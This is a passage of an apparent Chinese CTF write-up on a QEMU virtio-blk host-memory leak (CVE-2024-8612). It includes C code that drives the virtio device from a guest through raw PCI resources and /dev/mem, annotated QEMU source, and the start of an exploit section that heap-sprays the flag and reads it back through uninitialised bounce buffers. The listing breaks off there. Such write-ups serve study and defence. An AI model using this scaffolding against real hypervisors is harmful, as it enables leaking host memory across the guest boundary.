function_">mmio_read64</span><span class="params">(<span class="type">void</span>* addr)</span>{</span><br><span class="line">    <span class="keyword">return</span> *(<span class="keyword">volatile</span> <span class="type">uint64_t</span>*)addr;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write8</span><span class="params">(<span class="type">void</span>* addr, <span class="type">uint8_t</span> val)</span>{</span><br><span class="line">    *(<span class="keyword">volatile</span> <span class="type">uint8_t</span>*)addr = val;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write16</span><span class="params">(<span class="type">void</span>* addr, <span class="type">uint16_t</span> val)</span>{</span><br><span class="line">    *(<span class="keyword">volatile</span> <span class="type">uint16_t</span>*)addr = val;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write32</span><span class="params">(<span class="type">void</span>* addr, <span class="type">uint32_t</span> val)</span>{</span><br><span class="line">    *(<span class="keyword">volatile</span> <span class="type">uint32_t</span>*)addr = val;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write64</span><span class="params">(<span class="type">void</span>* addr, <span class="type">uint64_t</span> val)</span>{</span><br><span class="line">    *(<span class="keyword">volatile</span> <span class="type">uint64_t</span>*)addr = val;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="device-configuration-layout">Device configuration layout</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">virtio_blk_config</span> {</span></span><br><span class="line">        le64 capacity;</span><br><span class="line">        le32 size_max;</span><br><span class="line">        le32 seg_max;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">virtio_blk_geometry</span> {</span></span><br><span class="line">        le16 cylinders;</span><br><span class="line">        u8 heads;</span><br><span class="line">        u8 sectors;</span><br><span class="line">    } geometry;</span><br><span class="line">    le32 blk_size;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">virtio_blk_topology</span> {</span></span><br><span class="line">        <span class="comment">// # of logical blocks per physical block (log2)</span></span><br><span class="line">        u8 physical_block_exp;</span><br><span class="line">        <span class="comment">// offset of first aligned logical block</span></span><br><span class="line">        u8 alignment_offset;</span><br><span class="line">        <span class="comment">// suggested minimum I/O size in blocks</span></span><br><span class="line">        le16 min_io_size;</span><br><span class="line">        <span class="comment">// optimal (suggested maximum) I/O size in blocks</span></span><br><span class="line">        le32 opt_io_size;</span><br><span class="line">    } topology;</span><br><span class="line">    u8 writeback;</span><br><span class="line">    u8 unused0;</span><br><span class="line">    u16 num_queues;</span><br><span class="line">    le32 max_discard_sectors;</span><br><span class="line">    le32 max_discard_seg;</span><br><span class="line">    le32 discard_sector_alignment;</span><br><span class="line">    le32 max_write_zeroes_sectors;</span><br><span class="line">    le32 max_write_zeroes_seg;</span><br><span class="line">    u8 write_zeroes_may_unmap;</span><br><span class="line">    u8 unused1[<span class="number">3</span>];</span><br><span class="line">    le32 max_secure_erase_sectors;</span><br><span class="line">    le32 max_secure_erase_seg;</span><br><span class="line">    le32 secure_erase_sector_alignment;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">virtio_blk_zoned_characteristics</span> {</span></span><br><span class="line">        le32 zone_sectors;</span><br><span class="line">        le32 max_open_zones;</span><br><span class="line">        le32 max_active_zones;</span><br><span class="line">        le32 max_append_sectors;</span><br><span class="line">        le32 write_granularity;</span><br><span class="line">        u8 model;</span><br><span class="line">        u8 unused2[<span class="number">3</span>];</span><br><span class="line">    } zoned;</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h2 id="initialization">Initialization</h2><ol type="1"><li>Read <em>capabilities</em></li><li>Reset device</li><li>Reset <em>Virtqueue</em></li></ol><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">init_virtio</span><span class="params">()</span> {</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">"/sys/devices/pci0000:00/0000:00:04.0/config"</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>){</span><br><span class="line">        ERR(<span class="string">"Open virtio config"</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">virtio_pci_cap</span> <span class="title">cap</span>;</span></span><br><span class="line">    <span class="type">char</span>* config = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="type">int</span> bytes_read = read(fd, config, <span class="number">0x1000</span>);</span><br><span class="line">    <span class="keyword">if</span>(bytes_read &lt; <span class="number">0</span>){</span><br><span class="line">        ERR(<span class="string">"Read virtio config"</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">"/sys/devices/pci0000:00/0000:00:04.0/resource4"</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>){</span><br><span class="line">        ERR(<span class="string">"Open virtio resource4"</span>);</span><br><span class="line">    }</span><br><span class="line">    virtio_mmio = mmap(<span class="number">0</span>, <span class="number">0x4000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(virtio_mmio == (<span class="keyword">volatile</span> <span class="type">void</span>*)<span class="number">-1</span>){</span><br><span class="line">        ERR(<span class="string">"mmap virtio mem"</span>);</span><br><span class="line">    }</span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    u8 cap_ptr = *(u8*)(config+<span class="number">0x34</span>);</span><br><span class="line">    <span class="keyword">while</span>(cap_ptr != <span class="number">0</span>){</span><br><span class="line">        <span class="keyword">if</span>(config[cap_ptr] != <span class="number">0x9</span>){</span><br><span class="line">            cap_ptr = *(u8*)(config+cap_ptr+<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="built_in">memcpy</span>(&amp;cap, config+cap_ptr, <span class="keyword">sizeof</span>(cap));</span><br><span class="line">        print_cap(&amp;cap);</span><br><span class="line">        <span class="keyword">switch</span>(cap.cfg_type){</span><br><span class="line">            <span class="keyword">case</span> VIRTIO_PCI_CAP_COMMON_CFG:</span><br><span class="line">                virtio_common_mmio = virtio_mmio + cap.offset;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> VIRTIO_PCI_CAP_NOTIFY_CFG:</span><br><span class="line">                virtio_notify_mmio = (<span class="keyword">struct</span> virtio_notify_cfg*)((<span class="type">size_t</span>)virtio_mmio + cap.offset);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> VIRTIO_PCI_CAP_ISR_CFG:</span><br><span class="line">                virtio_isr_mmio = virtio_mmio + cap.offset;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> VIRTIO_PCI_CAP_DEVICE_CFG:</span><br><span class="line">                virtio_device_mmio = virtio_mmio + cap.offset;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        }</span><br><span class="line">        cap_ptr = cap.cap_next;</span><br><span class="line">    }</span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="built_in">free</span>(config);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">virtio_pci_common_cfg</span>* <span class="title">common_cfg</span> =</span> (<span class="keyword">struct</span> virtio_pci_common_cfg*)virtio_common_mmio;</span><br><span class="line">    mmio_write32(&amp;common_cfg-&gt;device_feature_select, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"device_feature[0]: %x\n"</span>, mmio_read32(&amp;common_cfg-&gt;device_feature));</span><br><span class="line">    mmio_write32(&amp;common_cfg-&gt;device_feature_select, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"device_feature[1]: %x\n"</span>, mmio_read32(&amp;common_cfg-&gt;device_feature));</span><br><span class="line">    mmio_write32(&amp;common_cfg-&gt;driver_feature_select, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"driver_feature[0]: %x\n"</span>, mmio_read32(&amp;common_cfg-&gt;driver_feature));</span><br><span class="line">    mmio_write32(&amp;common_cfg-&gt;driver_feature_select, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"driver_feature[1]: %x\n"</span>, mmio_read32(&amp;common_cfg-&gt;driver_feature));</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">virtio_blk_config</span>* <span class="title">blk_cfg</span> =</span> (<span class="keyword">struct</span> virtio_blk_config*)virtio_device_mmio;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"capacity: %lx\n"</span>, mmio_read64(&amp;blk_cfg-&gt;capacity));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"size_max: %x\n"</span>, mmio_read32(&amp;blk_cfg-&gt;size_max));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"seg_max: %x\n"</span>, mmio_read32(&amp;blk_cfg-&gt;seg_max));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"geometry.cylinders: %x\n"</span>, mmio_read16(&amp;blk_cfg-&gt;geometry.cylinders));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"geometry.heads: %x\n"</span>, mmio_read8(&amp;blk_cfg-&gt;geometry.heads));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"geometry.sectors: %x\n"</span>, mmio_read8(&amp;blk_cfg-&gt;geometry.sectors));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"blk_size: %x\n"</span>, mmio_read32(&amp;blk_cfg-&gt;blk_size));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// reset device</span></span><br><span class="line">    mmio_write8(&amp;common_cfg-&gt;device_status, <span class="number">0</span>);</span><br><span class="line">    mmio_write8(&amp;common_cfg-&gt;device_status, VIRTIO_CONFIG_S_ACKNOWLEDGE);</span><br><span class="line">    mmio_write8(&amp;common_cfg-&gt;device_status, VIRTIO_CONFIG_S_DRIVER | VIRTIO_CONFIG_S_ACKNOWLEDGE);</span><br><span class="line">    mmio_write32(&amp;common_cfg-&gt;driver_feature_select, <span class="number">0</span>);</span><br><span class="line">    mmio_write32(&amp;common_cfg-&gt;driver_feature, <span class="number">0</span>); <span class="comment">// disable all features</span></span><br><span class="line">    mmio_write8(&amp;common_cfg-&gt;device_status, VIRTIO_CONFIG_S_FEATURES_OK | VIRTIO_CONFIG_S_DRIVER | VIRTIO_CONFIG_S_ACKNOWLEDGE);</span><br><span class="line">    assert(mmio_read8(&amp;common_cfg-&gt;device_status) &amp; VIRTIO_CONFIG_S_FEATURES_OK);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// alloc dma memory</span></span><br><span class="line">    <span class="type">int</span> dma_fd = open(<span class="string">"/dev/mem"</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span>(dma_fd &lt; <span class="number">0</span>){</span><br><span class="line">        ERR(<span class="string">"Open dma"</span>);</span><br><span class="line">    }</span><br><span class="line">    dma_mem = mmap((<span class="type">void</span>*)<span class="number">0x3ffdd000</span>, <span class="number">0x3000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, dma_fd, <span class="number">0x3ffdd000</span>);</span><br><span class="line">    <span class="keyword">if</span>(dma_mem == (<span class="keyword">volatile</span> <span class="type">void</span>*)<span class="number">-1</span>){</span><br><span class="line">        ERR(<span class="string">"mmap dma mem"</span>);</span><br><span class="line">    }</span><br><span class="line">    *(<span class="keyword">volatile</span> <span class="type">uint32_t</span>*)dma_mem = <span class="number">0x12345678</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%x\n"</span>, *(<span class="keyword">volatile</span> <span class="type">uint32_t</span>*)dma_mem);</span><br><span class="line">    *(<span class="keyword">volatile</span> <span class="type">uint32_t</span>*)dma_mem = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"dma_mem: %p\n"</span>, dma_mem);</span><br><span class="line">    dma_data = dma_mem + <span class="number">0x1000</span>;</span><br><span class="line">    queue_desc = (<span class="keyword">struct</span> virtq_desc*)dma_mem;</span><br><span class="line">    queue_avail = (<span class="keyword">struct</span> virtq_avail*)((<span class="type">char</span>*)queue_desc + <span class="number">0x10</span> * VIRTIO_QUEUE_SIZE);</span><br><span class="line">    queue_used = (<span class="keyword">struct</span> virtq_used*)((<span class="type">char</span>*)dma_mem + <span class="number">0x200</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// init queue</span></span><br><span class="line">    mmio_write16(&amp;common_cfg-&gt;queue_select, <span class="number">0</span>);</span><br><span class="line">    mmio_write16(&amp;common_cfg-&gt;queue_size, VIRTIO_QUEUE_SIZE);</span><br><span class="line">    mmio_write64(&amp;common_cfg-&gt;queue_desc, (<span class="type">size_t</span>)<span class="number">0x3ffdd000</span>);</span><br><span class="line">    mmio_write64(&amp;common_cfg-&gt;queue_driver, (<span class="type">size_t</span>)<span class="number">0x3ffdd100</span>);</span><br><span class="line">    mmio_write64(&amp;common_cfg-&gt;queue_device, (<span class="type">size_t</span>)<span class="number">0x3ffdd200</span>);</span><br><span class="line">    mmio_write16(&amp;common_cfg-&gt;queue_enable, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    mmio_write8(&amp;common_cfg-&gt;device_status, VIRTIO_CONFIG_S_DRIVER_OK | VIRTIO_CONFIG_S_FEATURES_OK | VIRTIO_CONFIG_S_DRIVER | VIRTIO_CONFIG_S_ACKNOWLEDGE);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"virtio init done"</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h1 id="vulnerabilities">Vulnerabilities</h1><h2 id="cve-2024-8612">CVE-2024-8612</h2><p>从文件的字符串中可得知 qemu 的版本号为 <code>qemu-8.0.0-rc2</code>，存在一个关于 <code>virtio-blk-pci</code> 的信息泄漏漏洞:<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=2024-8612">CVE-2024-8612</a></p><p>具体利用还可以参考:</p><p><a href="https://www.youtube.com/watch?v=wL3LK9Dp4os">HEXACON2024 -DMAKiller: DMA to Escape from QEMU/KVM by Yongkang Jia, Yiming Tao &amp;Xiao Lei</a>,</p><p><a href="https://zqy.ink/2025/04/28/easydma/">ACTF2025-EasyDMAWriteup</a></p><p>当 DMA 访问的地址是 MMIO 的，会使用 <code>bounce buffer</code></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Map a physical memory region into a host virtual address.</span></span><br><span class="line"><span class="comment"> * May map a subset of the requested range, given by and returned in *plen.</span></span><br><span class="line"><span class="comment"> * May return NULL if resources needed to perform the mapping are exhausted.</span></span><br><span class="line"><span class="comment"> * Use only for reads OR writes - not for read-modify-write operations.</span></span><br><span class="line"><span class="comment"> * Use cpu_register_map_client() to know when retrying the map operation is</span></span><br><span class="line"><span class="comment"> * likely to succeed.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> *<span class="title function_">address_space_map</span><span class="params">(AddressSpace *as,</span></span><br><span class="line"><span class="params">                        hwaddr addr,</span></span><br><span class="line"><span class="params">                        hwaddr *plen,</span></span><br><span class="line"><span class="params">                        <span class="type">bool</span> is_write,</span></span><br><span class="line"><span class="params">                        MemTxAttrs attrs)</span></span><br><span class="line">{</span><br><span class="line">    hwaddr len = *plen;</span><br><span class="line">    hwaddr l, xlat;</span><br><span class="line">    MemoryRegion *mr;</span><br><span class="line">    FlatView *fv;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (len == <span class="number">0</span>) {</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    l = len;</span><br><span class="line">    RCU_READ_LOCK_GUARD();</span><br><span class="line">    fv = address_space_to_flatview(as);</span><br><span class="line">    mr = flatview_translate(fv, addr, &amp;xlat, &amp;l, is_write, attrs);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!memory_access_is_direct(mr, is_write)) {</span><br><span class="line">        <span class="keyword">if</span> (qatomic_xchg(&amp;bounce.in_use, <span class="literal">true</span>)) {</span><br><span class="line">            *plen = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        }</span><br><span class="line">               <span class="comment">/* Avoid unbounded allocations */</span></span><br><span class="line">        l = MIN(l, TARGET_PAGE_SIZE);</span><br><span class="line">        bounce.buffer = qemu_memalign(TARGET_PAGE_SIZE, l);</span><br><span class="line">        bounce.addr = addr;</span><br><span class="line">        bounce.len = l;</span><br><span class="line"></span><br><span class="line">        memory_region_ref(mr);</span><br><span class="line">        bounce.mr = mr;</span><br><span class="line">        <span class="keyword">if</span> (!is_write) {</span><br><span class="line">            flatview_read(fv, addr, MEMTXATTRS_UNSPECIFIED,</span><br><span class="line">                               bounce.buffer, l);</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        *plen = l;</span><br><span class="line">        <span class="keyword">return</span> bounce.buffer;</span><br><span class="line">    }</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>同时，通过 <code>qemu_memalign</code> 得到的内存并没有初始化。</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">virtio_blk_handle_request</span><span class="params">(VirtIOBlockReq *req, MultiReqBuffer *mrb)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">uint32_t</span> type;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> *<span class="title">in_iov</span> =</span> req-&gt;elem.in_sg;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> *<span class="title">out_iov</span> =</span> req-&gt;elem.out_sg;</span><br><span class="line">    <span class="type">unsigned</span> in_num = req-&gt;elem.in_num;</span><br><span class="line">    <span class="type">unsigned</span> out_num = req-&gt;elem.out_num;</span><br><span class="line">    VirtIOBlock *s = req-&gt;dev;</span><br><span class="line">    VirtIODevice *vdev = VIRTIO_DEVICE(s);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (req-&gt;elem.out_num &lt; <span class="number">1</span> || req-&gt;elem.in_num &lt; <span class="number">1</span>) {</span><br><span class="line">        virtio_error(vdev, <span class="string">"virtio-blk missing headers"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (unlikely(iov_to_buf(out_iov, out_num, <span class="number">0</span>, &amp;req-&gt;out,</span><br><span class="line">                            <span class="keyword">sizeof</span>(req-&gt;out)) != <span class="keyword">sizeof</span>(req-&gt;out))) {</span><br><span class="line">        virtio_error(vdev, <span class="string">"virtio-blk request outhdr too short"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    iov_discard_front_undoable(&amp;out_iov, &amp;out_num, <span class="keyword">sizeof</span>(req-&gt;out),</span><br><span class="line">                               &amp;req-&gt;outhdr_undo);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (in_iov[in_num - <span class="number">1</span>].iov_len &lt; <span class="keyword">sizeof</span>(<span class="keyword">struct</span> virtio_blk_inhdr)) {</span><br><span class="line">        virtio_error(vdev, <span class="string">"virtio-blk request inhdr too short"</span>);</span><br><span class="line">        iov_discard_undo(&amp;req-&gt;outhdr_undo);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    </span><br><span class="line">    req-&gt;in_len = iov_size(in_iov, in_num);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">case</span> VIRTIO_BLK_T_IN:</span><br><span class="line">    {</span><br><span class="line">        <span class="type">bool</span> is_write = type &amp; VIRTIO_BLK_T_OUT;</span><br><span class="line">        req-&gt;sector_num = virtio_ldq_p(vdev, &amp;req-&gt;out.sector);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is_write) {</span><br><span class="line">            qemu_iovec_init_external(&amp;req-&gt;qiov, out_iov, out_num);</span><br><span class="line">            trace_virtio_blk_handle_write(vdev, req, req-&gt;sector_num,</span><br><span class="line">                                          req-&gt;qiov.size / BDRV_SECTOR_SIZE);</span><br><span class="line">        } <span class="keyword">else</span> {</span><br><span class="line">            qemu_iovec_init_external(&amp;req-&gt;qiov, in_iov, in_num);</span><br><span class="line">            trace_virtio_blk_handle_read(vdev, req, req-&gt;sector_num,</span><br><span class="line">                                         req-&gt;qiov.size / BDRV_SECTOR_SIZE);</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!virtio_blk_sect_range_ok(s, req-&gt;sector_num, req-&gt;qiov.size)) {</span><br><span class="line">            virtio_blk_req_complete(req, VIRTIO_BLK_S_IOERR);</span><br><span class="line">            block_acct_invalid(blk_get_stats(s-&gt;blk),</span><br><span class="line">                               is_write ? BLOCK_ACCT_WRITE : BLOCK_ACCT_READ);</span><br><span class="line">            virtio_blk_free_request(req);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        }</span><br><span class="line">        </span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">    virtio_blk_req_complete(req, VIRTIO_BLK_S_UNSUPP);</span><br><span class="line">    virtio_blk_free_request(req);</span><br><span class="line">        </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>在 <code>virtio_blk_handle_request</code>，即使请求不合法，长度也被写入到 <code>req-&gt;in_len</code>。<code>type</code> 不合法时，直接调用 <code>virtio_blk_req_complete</code></p><p>调用链：<code>virtio_blk_handle_request-&gt;virtio_blk_req_complete-&gt;virtqueue_push-&gt;virtqueue_fill-&gt;virtqueue_unmap_sg-&gt;dma_memory_unmap-&gt;address_space_unmap-&gt;address_space_write</code></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">MemTxResult <span class="title function_">address_space_write</span><span class="params">(AddressSpace *as, hwaddr addr,</span></span><br><span class="line"><span class="params">                                MemTxAttrs attrs,</span></span><br><span class="line"><span class="params">                                <span class="type">const</span> <span class="type">void</span> *buf, <span class="type">int</span> len)</span></span><br><span class="line">{</span><br><span class="line">    MemTxResult result;</span><br><span class="line">    __bufread(buf, len);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>由于缺乏保护，数据可以被写到<strong><em> Commonconfiguration</em></strong> 部分，并且部分空间可被读出。</p><h1 id="exploit">Exploit</h1><p>通过堆喷，将 flag 字符串填充在内存中。利用上述漏洞读出内存内容。</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 